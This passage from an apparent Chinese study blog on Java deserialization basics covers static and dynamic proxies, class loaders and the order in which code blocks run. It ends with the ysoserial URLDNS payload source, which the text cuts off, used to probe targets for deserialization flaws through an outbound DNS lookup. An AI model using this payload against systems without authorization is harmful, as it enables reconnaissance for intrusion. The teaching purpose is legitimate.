<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>代理模式是常用的java设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。</p>
<p>简单来说，就是一个中间人，代表其他对象来进行处理，举个例子：假设现在有房东、中介、租户三个对象，房东对象只有出租房子的方法，但租户需要有租金交付，房子维护等等方法，这个时候中介就有用了，他能代替房东进行租金收取，房子维护等方法的实现，但并不改变房东的原本的方法。这里的中介，就是代理</p>
<h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><p>静态代理是编译时就确定好的代理类。你需要手动创建代理类和真实对象的接口。</p>
<p>工作原理：静态代理的代理类在编译时就已经创建好，并且实现了和真实对象一样的接口。代理类中会持有一个真实对象的引用，在方法调用时，可以在调用真实对象方法之前或之后添加额外的功能。</p>
<p>举个例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 真实对象的接口</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Subject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 真实对象</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RealSubject</span> <span class="token keyword">implements</span> <span class="token class-name">Subject</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"RealSubject: Handling request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 代理对象</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProxySubject</span> <span class="token keyword">implements</span> <span class="token class-name">Subject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">RealSubject</span> realSubject<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ProxySubject</span><span class="token punctuation">(</span><span class="token class-name">RealSubject</span> realSubject<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>realSubject <span class="token operator">=</span> realSubject<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 在调用真实对象之前做一些额外的操作</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Proxy: Before calling request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        realSubject<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 在调用真实对象之后做一些额外的操作</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Proxy: After calling request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 使用代理对象</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">RealSubject</span> realSubject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RealSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ProxySubject</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProxySubject</span><span class="token punctuation">(</span>realSubject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        proxy<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个例子中，我们有一个代理对象在不改变原本真实对象的情况下是西安对功能的增加，但是缺点是我们每增加一个代理，我们就需要多个代理类，假设说我们有a、b、c、d等很多个代理，我们就需要编写对应数量的代理类。及其复杂。</p>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p>动态代理是在运行时创建的代理类。你不需要手动编写代理类代码，Java 会自动生成代理类。</p>
<p><strong>工作原理</strong>：动态代理利用 Java 反射机制在运行时生成代理类。你只需要提供一个接口和一个 <code>InvocationHandler</code> 对象，Java 会自动创建一个代理对象。</p>
<p>举个例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>

<span class="token comment">// 真实对象的接口</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Subject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 真实对象</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RealSubject</span> <span class="token keyword">implements</span> <span class="token class-name">Subject</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"RealSubject: Handling request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// InvocationHandler 实现类</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DynamicProxyHandler</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">Object</span> realSubject<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">DynamicProxyHandler</span><span class="token punctuation">(</span><span class="token class-name">Object</span> realSubject<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>realSubject <span class="token operator">=</span> realSubject<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 在调用真实对象之前做一些额外的操作</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Proxy: Before calling request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> result <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>realSubject<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 在调用真实对象之后做一些额外的操作</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Proxy: After calling request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 使用动态代理对象</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">RealSubject</span> realSubject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RealSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Subject</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Subject</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>
            realSubject<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            realSubject<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">DynamicProxyHandler</span><span class="token punctuation">(</span>realSubject<span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        proxy<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个例子当中，我们就不需要每新增一个真实对象就编写一个对应的代理对象，只需实现<code>InvocationHandler</code>实现类，然后在每次真是对象需要相同的代理功能时，调用就行。</p>
<h3 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h3><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p> 类加载器（ClassLoader）是 Java 虚拟机 (JVM) 中的一个组件，用于动态加载 Java 类到 JVM 中。类加载器负责在程序运行时将类的字节码文件（.class 文件）加载到内存，并将其转换为 <code>Class</code> 对象，以便 JVM 可以执行这些类。  </p>
<p>作用：</p>
<ol>
<li>加载类：从文件系统、网络或者其他来源加载 Java 类。</li>
<li>连接类：验证、准备和解析类数据。</li>
<li>初始化类：执行类的静态初始化块和静态变量的初始化。</li>
</ol>
<p>类加载器有很多种，通常分为下面这几种：虚拟机自带的加载器，启动类（根）加载器，扩展类加载器，应用程序加载器</p>
<h4 id="几种类加载器"><a href="#几种类加载器" class="headerlink" title="几种类加载器"></a>几种类加载器</h4><p><strong>引导类加载器</strong></p>
<p>引导类加载器(BootstrapClassLoader)，底层原生代码是 C++ 语言编写，属于 JVM 一部分。</p>
<p><font style="color:rgb(80, 80, 92);">不继承 </font><code>java.lang.ClassLoader</code><font style="color:rgb(80, 80, 92);"> 类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在 </font><code>/jre/lib/rt.jar</code><font style="color:rgb(80, 80, 92);"> 目录当中。(同时处于安全考虑，</font><code>BootstrapClassLoader</code><font style="color:rgb(80, 80, 92);"> 只加载包名为 </font><code>java</code><font style="color:rgb(80, 80, 92);">、</font><code>javax</code><font style="color:rgb(80, 80, 92);">、</font><code>sun</code><font style="color:rgb(80, 80, 92);"> 等开头的类)</font></p>
<p><strong><font style="color:rgb(80, 80, 92);">扩展类加载器</font></strong></p>
<p><font style="color:rgb(80, 80, 92);">扩展类加载器(ExtensionsClassLoader)，由 </font><code>sun.misc.Launcher$ExtClassLoader</code><font style="color:rgb(80, 80, 92);"> 类实现，用来在 </font><code>/jre/lib/ext</code><font style="color:rgb(80, 80, 92);"> 或者 </font><code>java.ext.dirs</code><font style="color:rgb(80, 80, 92);"> 中指明的目录加载 java 的扩展库。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。</font></p>
<p><strong><font style="color:rgb(80, 80, 92);">app类加载器</font></strong></p>
<p><font style="color:rgb(80, 80, 92);">App类加载器&#x2F;系统类加载器（AppClassLoader），由 </font><code>sun.misc.Launcher$AppClassLoader</code><font style="color:rgb(80, 80, 92);"> 实现，一般通过通过( </font><code>java.class.path</code><font style="color:rgb(80, 80, 92);"> 或者 </font><code>Classpath</code><font style="color:rgb(80, 80, 92);"> 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 </font><code>ClassLoader.getSystemClassLoader()</code><font style="color:rgb(80, 80, 92);"> 来获取它。</font></p>
<h4 id="各场景下代码块的加载顺序"><a href="#各场景下代码块的加载顺序" class="headerlink" title="各场景下代码块的加载顺序"></a><font style="color:rgb(80, 80, 92);">各场景下代码块的加载顺序</font></h4><p>代码块主要有下面四种</p>
<ul>
<li>静态代码块：<code>static&#123;&#125;</code></li>
<li>构造代码块：<code>&#123;&#125;</code></li>
<li>无参构造器：<code>ClassName()</code></li>
<li>有参构造器：<code>ClassName(String name)</code></li>
</ul>
<p>在不同的情况下，这些会有不同的执行</p>
<p><strong>一、实例化对象</strong></p>
<p>例子如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
  
<span class="token comment">// 存放代码块  </span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> staticVar<span class="token punctuation">;</span>  
 <span class="token keyword">public</span> <span class="token keyword">int</span> instanceVar<span class="token punctuation">;</span>  
  
 <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
  
    <span class="token punctuation">&#123;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
  
    <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参构造器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
    <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token keyword">int</span> instanceVar<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参构造器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">staticAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
  
<span class="token comment">// 代码块的启动器  </span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在Person类中存在静态方法、构造方法、有参方法、无参方法，在运行main方法后情况如下</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721095430221-e69a4c30-f98a-4c2e-9d58-e8361d892638.png"></p>
<p>结论：</p>
<p><font style="color:rgb(80, 80, 92);">通过 </font><code>new</code><font style="color:rgb(80, 80, 92);"> 关键字实例化的对象，先调用</font><strong><font style="color:rgb(80, 80, 92);">静态代码块</font></strong><font style="color:rgb(80, 80, 92);">，然后调用</font><strong><font style="color:rgb(80, 80, 92);">构造代码块</font></strong><font style="color:rgb(80, 80, 92);">，最后根据实例化方式不同，调用不同的构造器。</font></p>
<p><font style="color:rgb(80, 80, 92);">下面的东西都差不多，我们直接说结论和粘运行结果：</font></p>
<p><strong><font style="color:rgb(80, 80, 92);">二、调用静态方法</font></strong></p>
<p><font style="color:rgb(80, 80, 92);">运行结果</font></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721095814752-1b8b9f2c-a1c3-4c0f-b875-3c850cb01a8f.png"></p>
<p>结论：</p>
<p><font style="color:rgb(80, 80, 92);">不实例化对象直接调用静态方法，会先调用类中的</font><strong><font style="color:rgb(80, 80, 92);">静态代码块</font></strong><font style="color:rgb(80, 80, 92);">，然后调用</font><strong><font style="color:rgb(80, 80, 92);">静态方法</font></strong></p>
<p>**<font style="color:rgb(80, 80, 92);">三、</font>**<strong>对类中的静态成员变量赋值</strong></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721095938207-1f89daa3-11c8-4d24-ae86-430934e3e90a.png"></p>
<p>结论：</p>
<p><font style="color:rgb(80, 80, 92);">在对静态成员变量赋值前，会调用</font><strong><font style="color:rgb(80, 80, 92);">静态代码块</font></strong></p>
<p><strong>四、使用 class 获取类</strong></p>
<p>结论：<font style="color:rgb(80, 80, 92);">利用 </font><code>class</code><font style="color:rgb(80, 80, 92);"> 关键字获取类，并不会加载类，也就是什么也不会输出。</font></p>
<p>**<font style="color:rgb(80, 80, 92);">五、</font>**<strong>使用 forName 获取类</strong></p>
<p>结论：</p>
<p><code>Class.forName(className)</code><font style="color:rgb(80, 80, 92);">和</font><code>Class.forName(className, true, ClassLoader.getSystemClassLoader())</code><font style="color:rgb(80, 80, 92);">等价，这两个方法都会调用类中的</font><strong><font style="color:rgb(80, 80, 92);">静态代码块</font></strong><font style="color:rgb(80, 80, 92);">，如果将第二个参数设置为</font><code>false</code><font style="color:rgb(80, 80, 92);">，那么就不会调用静态代码块</font></p>
<p>**<font style="color:rgb(80, 80, 92);">六、</font>**<strong>使用 ClassLoader.loadClass() 获取类</strong></p>
<p>结论：</p>
<p><code>ClassLoader.loadClass()</code><font style="color:rgb(80, 80, 92);">方法不会进行类的初始化，当然，如果后面再使用</font><code>newInstance()</code><font style="color:rgb(80, 80, 92);">进行初始化，那么会和</font><code>场景一、实例化对象</code><font style="color:rgb(80, 80, 92);">一样的顺序加载对应的代码块。</font></p>
<p><font style="color:rgb(80, 80, 92);">详细讲述见：</font><a href="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/">Java反序列化基础篇-05-类的动态加载 | Drunkbaby’s Blog</a></p>
<h2 id="URLDNS链的分析"><a href="#URLDNS链的分析" class="headerlink" title="URLDNS链的分析"></a><code>URLDNS</code>链的分析</h2><p><code>URLDNS</code>链常用于检测java反序列化是否存在，因为是原生态，因此不存在版本限制，我们可以在任意版本使用此链来检测是否存在Java反序列化。直接看ysoserial的<code>payload</code>：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">InetAddress</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLConnection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLStreamHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Authors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Dependencies</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PayloadTest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PayloadRunner</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Reflections</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token string">"rawtypes"</span><span class="token punctuation">,</span> <span class="token string">"unchecked"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@PayloadTest</span><span class="token punctuation">(</span>skip <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Authors</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token class-name">Authors</span><span class="token punctuation">.</span><span class="token constant">GEBL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLDNS</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectPayload</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>

                <span class="token comment">//Avoid DNS resolution during payload creation</span>
                <span class="token comment">//Since the field &lt;code>java.net.URL.handler&lt;/code> is transient, it will not be part of the serialized payload.</span>
                <span class="token class-name">URLStreamHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SilentURLStreamHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token class-name">HashMap</span> ht <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// HashMap that will contain the URL</span>
                <span class="token class-name">URL</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// URL to use as the Key</span>
                ht<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>

                <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token string">"hashCode"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>

                <span class="token keyword">return</span> ht<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">PayloadRunner</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token constant">URLDNS</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>


        <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SilentURLStreamHandler</span> <span class="token keyword">extends</span> <span class="token class-name">URLStreamHandler</span> <span class="token punctuation">&#123;</span>

                <span class="token keyword">protected</span> <span class="token class-name">URLConnection</span> <span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

